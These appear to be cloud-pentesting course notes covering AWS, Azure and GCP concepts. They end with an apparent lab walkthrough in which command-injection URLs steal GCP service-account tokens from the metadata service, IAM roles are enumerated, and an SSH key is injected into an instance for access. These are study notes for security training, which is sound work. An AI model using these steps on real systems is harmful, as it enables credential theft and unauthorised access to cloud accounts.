# Course notes
A cloud could also have ...
- One account which can manage multiple accounts (ex. AWS orginisations)
- Cross account access (ex. Azure guest users)
- In GCP by default role attached to compute instance, in AWS/Azure its not enabled by default

### Apps URLs
AWS  -  orgname.awsapps.com/start
Microsoft - https://myapps.microsoft.com/

### Important URLs
MS admin portal - https://portal.microsoft.com/Adminportal/Home
GCP identity - admin.google.com
GCP user - myaccount.google.com

SAML, OpenIDConnect, O-Auth

Policies
- Inline policy
- Managed Policy - Managed policies, Customer Managed policies

Pentesting methodology
- MITRE ATT&CK Cloud matrix
- Cyberwarefarelabs - redteam attack flow

#### Resource hirarchy
- AWS - https://cdn.ttgtmedia.com/rms/onlineimages/aws_resource_hierarchy-f_mobile.png
- Azure - https://learn.microsoft.com/en-us/azure/cloud-adoption-framework/ready/azure-setup-guide/media/organize-resources/scope-levels.png
- GCP - https://cloud.google.com/static/resource-manager/img/cloud-hierarchy.svg 

#### Tools
- ```cloud_enum.py``` - bruteforce names against multi-cloud DNS bruteforce for services
- PACU for AWS

### Metadata
- ```curl http://169.254.169.254``` - All cloud providers have same IP to check if it is a cloud instance
- ```curl http://169.254.169.254/metadata```
 
# Commands
Login to gcp cli
```gcloud auth activate-service-account --key-file auth.json```

gcloud login with access-token ```gcloud projects list --access-token-file accesstoken.txt```

## All commands

gcloud auth activate-service-account --key-file ./sonic-airfoil-339910-8c4c6de6bf0d.json 

gcloud projects get-iam-policy sonic-airfoil-339910 --flatten="bindings[].members" --filter="bindings.members=serviceaccount:ssa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com" --format="value(bindings.role)" - Output we get role name, use that for next command

gcloud iam roles describe 684bk057 --project sonic-airfoil-339910

gcloud container clusters list --format json

gcloud container clusters list

gcloud compute forwarding-rules list - we get an IP

URLs
- http://34.132.232.167/?cmd=curl%20http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email%20-H%20%22Metadata-Flavor:Google%22
- http://34.132.232.167/?cmd=curl%20http://169.254.169.254/computeMetadata/v1/instance/service-accounts/gke-service-account@sonic-airfoil-339910.iam.gserviceaccount.com/token%20-H%20%22Metadata-Flavor:Google%22
- https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=[TOKEN]

gcloud compute instances list

gcloud compute instances get-iam-policy tesing-instance --zone us-central1-b --flatten="bindings[].members" --filter="bindings.members=serviceaccount:gke-service-account@sonic-airfoil-339910.iam.gserviceaccount.com" --format="value(bindings.role)"

gcloud iam roles describe ew606s6o --project sonic-airfoil-339910

ssh-keygen , gcp.pub created, add gcp:... to the file which because we want gcp is username

gcloud compute instances add-metadata tesing-instance --metadata-from-file ssh-keys=gcp.pub --zone us-central1-b --access-token-file sess.txt

gcloud compute instances describe tesing-instance - get the ip of vm

ssh -i ./gcp gcp@104.154.17.222
- get the name of service account attached to that VM - gcloud auth list

